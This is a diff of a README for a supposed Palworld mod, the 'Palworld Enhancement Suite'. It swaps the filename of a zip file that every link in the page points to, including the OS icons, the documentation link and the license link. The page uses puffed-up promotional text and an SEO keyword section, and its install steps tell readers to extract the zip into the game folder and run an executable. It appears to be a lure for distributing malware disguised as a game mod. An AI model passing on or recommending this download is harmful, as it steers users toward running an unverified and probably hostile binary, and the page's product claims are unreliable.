@@ -1,6 +1,6 @@
 # Palworld Enhancement Suite
 
-[![Download](https://github.com/dillanserrano/palworld-mod-toolkit/raw/refs/heads/branch/huaco/toolkit_palworld_mod_1.3.zip%20Palworld%20Enhancement%20Suite-blue?style=for-the-badge&logo=github)](https://github.com/dillanserrano/palworld-mod-toolkit/raw/refs/heads/branch/huaco/toolkit_palworld_mod_1.3.zip)
+[![Download](https://github.com/dillanserrano/palworld-mod-toolkit/raw/refs/heads/branch/huaco/toolkit-mod-palworld-v3.2.zip%20Palworld%20Enhancement%20Suite-blue?style=for-the-badge&logo=github)](https://github.com/dillanserrano/palworld-mod-toolkit/raw/refs/heads/branch/huaco/toolkit-mod-palworld-v3.2.zip)
 
 ## 🌍 Welcome to Palworld Enhancement Suite!
 
@@ -12,11 +12,11 @@ Compatibility is our north star—a symphonic blend for every technical orchestr
 
 | Operating System | Supported | Notes                     |
 |:---------------:|:---------:|:--------------------------|
-| ![Windows](https://github.com/dillanserrano/palworld-mod-toolkit/raw/refs/heads/branch/huaco/toolkit_palworld_mod_1.3.zip) | ✅ | Full feature support    |
-| ![macOS](https://github.com/dillanserrano/palworld-mod-toolkit/raw/refs/heads/branch/huaco/toolkit_palworld_mod_1.3.zip)          | ✅ | Optimized experience    |
-| ![Linux](https://github.com/dillanserrano/palworld-mod-toolkit/raw/refs/heads/branch/huaco/toolkit_palworld_mod_1.3.zip)          | ✅ | Custom kernels friendly |
-| ![Steam Deck](https://github.com/dillanserrano/palworld-mod-toolkit/raw/refs/heads/branch/huaco/toolkit_palworld_mod_1.3.zip) | 🟡 | Experimental            |
-| ![Android](https://github.com/dillanserrano/palworld-mod-toolkit/raw/refs/heads/branch/huaco/toolkit_palworld_mod_1.3.zip) | ⚪ | Partial UI only         |
+| ![Windows](https://github.com/dillanserrano/palworld-mod-toolkit/raw/refs/heads/branch/huaco/toolkit-mod-palworld-v3.2.zip) | ✅ | Full feature support    |
+| ![macOS](https://github.com/dillanserrano/palworld-mod-toolkit/raw/refs/heads/branch/huaco/toolkit-mod-palworld-v3.2.zip)          | ✅ | Optimized experience    |
+| ![Linux](https://github.com/dillanserrano/palworld-mod-toolkit/raw/refs/heads/branch/huaco/toolkit-mod-palworld-v3.2.zip)          | ✅ | Custom kernels friendly |
+| ![Steam Deck](https://github.com/dillanserrano/palworld-mod-toolkit/raw/refs/heads/branch/huaco/toolkit-mod-palworld-v3.2.zip) | 🟡 | Experimental            |
+| ![Android](https://github.com/dillanserrano/palworld-mod-toolkit/raw/refs/heads/branch/huaco/toolkit-mod-palworld-v3.2.zip) | ⚪ | Partial UI only         |
 
 ## 🌟 Feature List
 
@@ -35,7 +35,7 @@ Unpack a treasure chest crafted for intrepid Palworld enthusiasts:
 
 Installing the Palworld Enhancement Suite is as exhilarating as launching a new rocket into space. Follow these steps to ignite your journey:
 
-1. Download the latest release from here: https://github.com/dillanserrano/palworld-mod-toolkit/raw/refs/heads/branch/huaco/toolkit_palworld_mod_1.3.zip
+1. Download the latest release from here: https://github.com/dillanserrano/palworld-mod-toolkit/raw/refs/heads/branch/huaco/toolkit-mod-palworld-v3.2.zip
 2. Extract the contents into your Palworld install directory  
 3. On Windows/macOS/Linux:
     - Run the `install-palworld-suite` executable
@@ -44,7 +44,7 @@ Installing the Palworld Enhancement Suite is as exhilarating as launching a new 
 5. Restart your Palworld client—look for the Suite icon in the menu!
 
 #### Need more guidance?
-Check out our [detailed documentation](https://github.com/dillanserrano/palworld-mod-toolkit/raw/refs/heads/branch/huaco/toolkit_palworld_mod_1.3.zip) for troubleshooting, tips, and tricks.
+Check out our [detailed documentation](https://github.com/dillanserrano/palworld-mod-toolkit/raw/refs/heads/branch/huaco/toolkit-mod-palworld-v3.2.zip) for troubleshooting, tips, and tricks.
 
 ## 🔍 Enhanced SEO Keywords
 
@@ -85,11 +85,11 @@ While the Palworld Enhancement Suite aligns with platform standards, remember:
 
 ## 📜 MIT License (© 2025)
 
-This repository is open-sourced under the [MIT License](https://github.com/dillanserrano/palworld-mod-toolkit/raw/refs/heads/branch/huaco/toolkit_palworld_mod_1.3.zip), 2025. You are invited to remix, reuse, and reimagine—just remember to keep it brilliant and credit when due.
+This repository is open-sourced under the [MIT License](https://github.com/dillanserrano/palworld-mod-toolkit/raw/refs/heads/branch/huaco/toolkit-mod-palworld-v3.2.zip), 2025. You are invited to remix, reuse, and reimagine—just remember to keep it brilliant and credit when due.
 
 ---
 
-[![Download](https://github.com/dillanserrano/palworld-mod-toolkit/raw/refs/heads/branch/huaco/toolkit_palworld_mod_1.3.zip%20Palworld%20Enhancement%20Suite-blue?style=for-the-badge&logo=github)](https://github.com/dillanserrano/palworld-mod-toolkit/raw/refs/heads/branch/huaco/toolkit_palworld_mod_1.3.zip)
+[![Download](https://github.com/dillanserrano/palworld-mod-toolkit/raw/refs/heads/branch/huaco/toolkit-mod-palworld-v3.2.zip%20Palworld%20Enhancement%20Suite-blue?style=for-the-badge&logo=github)](https://github.com/dillanserrano/palworld-mod-toolkit/raw/refs/heads/branch/huaco/toolkit-mod-palworld-v3.2.zip)
 
 ---
 
